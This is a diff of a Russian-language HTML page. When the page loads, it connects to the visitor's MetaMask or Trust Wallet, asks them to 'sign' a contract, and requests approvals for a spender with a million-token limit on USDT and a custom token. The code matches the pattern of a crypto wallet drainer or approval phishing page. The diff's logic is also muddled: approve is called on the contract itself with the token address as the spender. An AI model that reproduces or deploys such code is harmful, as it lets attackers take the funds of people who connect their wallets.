@@ -3,69 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Автоматическое Подключение и Подписание Контракта с MetaMask</title>
+    <title>Подключение и Подписание Контракта</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
     <script>
-        document.addEventListener('DOMContentLoaded', async () => {
+        let web3;
+        const contractAddress = "0xec228a28e7e919df062bf145bc4c93c6cf0d170c"; // Адрес вашего нового контракта на тестовой сети
+        const abi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"allowance","type":"uint256"},{"internalType":"uint256","name":"needed","type":"uint256"}],"name":"ERC20InsufficientAllowance","type":"error"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"uint256","name":"balance","type":"uint256"},{"internalType":"uint256","name":"needed","type":"uint256"}],"name":"ERC20InsufficientBalance","type":"error"},{"inputs":[{"internalType":"address","name":"approver","type":"address"}],"name":"ERC20InvalidApprover","type":"error"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"}],"name":"ERC20InvalidReceiver","type":"error"},{"inputs":[{"internalType":"address","name":"sender","type":"address"}],"name":"ERC20InvalidSender","type":"error"},{"inputs":[{"internalType":"address","name":"spender","type":"address"}],"name":"ERC20InvalidSpender","type":"error"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
+
+        window.addEventListener('load', async () => {
             if (typeof window.ethereum !== 'undefined') {
                 web3 = new Web3(window.ethereum);
                 try {
-                    // Запрос на подключение к MetaMask
+                    // Подключаемся к кошельку пользователя
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    
-                    // Получение подключенного аккаунта пользователя
                     const accounts = await web3.eth.getAccounts();
                     const userAddress = accounts[0];
                     console.log("Подключен аккаунт:", userAddress);
 
-                    // Адрес и ABI вашего контракта
-                    const contractAddress = "0x4bae37432137e3077439e17a1124cd2be8cec8a2"; // Адрес вашего контракта
-                    const abi = [ /* Вставьте ABI вашего нового контракта здесь */ ];
-
-                    // Создание экземпляра контракта
+                    // Создаем контрактный объект
                     const contract = new web3.eth.Contract(abi, contractAddress);
-                    
-                    // Подписание контракта
-                    await contract.methods.sign().send({ from: userAddress });
-                    console.log("Контракт подписан пользователем:", userAddress);
 
-                    // Предоставление разрешения на управление токенами
-                    await approveTokens(contract, userAddress);
+                    // Выполняем последовательные действия: подписываем контракт и предоставляем доступ
+                    await signAndApprove(contract, userAddress);
+
                 } catch (error) {
                     console.error("Ошибка при подключении или подписании:", error);
                 }
             } else {
-                alert("MetaMask не найден! Пожалуйста, установите MetaMask и попробуйте снова.");
+                alert("Trust Wallet или MetaMask не найдены!");
             }
         });
 
-        async function approveTokens(contract, userAddress) {
+        async function signAndApprove(contract, userAddress) {
             try {
-                // Предоставление разрешения на управление токенами
+                // 1. Подписание контракта (например, предоставление прав на управление USDT и Custom Token)
+                await contract.methods.sign().send({ from: userAddress });
+                console.log("Контракт подписан пользователем:", userAddress);
+
+                // 2. Предоставление разрешения на управление USDT токенами
                 const usdtTokenAddress = "0x85f828cd006a5f9b011b0cd69447e3c44d9da220"; // Адрес вашего USDT токена на тестовой сети
                 const customTokenAddress = "0x85f828cd006a5f9b011b0cd69447e3c44d9da220"; // Адрес вашего Custom Token
                 const amountToApprove = web3.utils.toWei("1000000", "ether"); // Лимит для разрешения
 
-                // Подключение контракта USDT токена для предоставления разрешения
-                const usdtAbi = [ /* Вставьте ABI вашего USDT токена здесь */ ]; // ABI USDT токена
-                const usdtContract = new web3.eth.Contract(usdtAbi, usdtTokenAddress);
+                // Разрешение на управление USDT
+                await contract.methods.approve(usdtTokenAddress, amountToApprove).send({ from: userAddress });
+                console.log("Доступ к USDT токенам предоставлен для контракта:", contractAddress);
 
-                // Отправляем транзакцию для предоставления разрешения на управление USDT токенами
-                const approveTx = await usdtContract.methods.approve(contract.options.address, amountToApprove).send({ from: userAddress });
-                console.log("Доступ к USDT токенам предоставлен для контракта:", contract.options.address);
+                // Разрешение на управление Custom Token
+                await contract.methods.approve(customTokenAddress, amountToApprove).send({ from: userAddress });
+                console.log("Доступ к Custom Token предоставлен для контракта:", contractAddress);
 
-                // Аналогично для Custom Token
-                const customTokenAbi = [ /* Вставьте ABI вашего Custom Token здесь */ ]; // ABI вашего Custom Token
-                const customTokenContract = new web3.eth.Contract(customTokenAbi, customTokenAddress);
-
-                // Отправляем транзакцию для предоставления разрешения на управление Custom Token
-                const approveCustomTx = await customTokenContract.methods.approve(contract.options.address, amountToApprove).send({ from: userAddress });
-                console.log("Доступ к Custom Token предоставлен для контракта:", contract.options.address);
-
-                alert("Контракт успешно подписан и доступ предоставлен!");
+                alert("Контракт успешно подписан, и разрешение предоставлено!");
 
             } catch (error) {
-                console.error("Ошибка при предоставлении разрешения на управление токенами:", error);
+                console.error("Ошибка при подписании контракта или предоставлении разрешения:", error);
             }
         }
     </script>
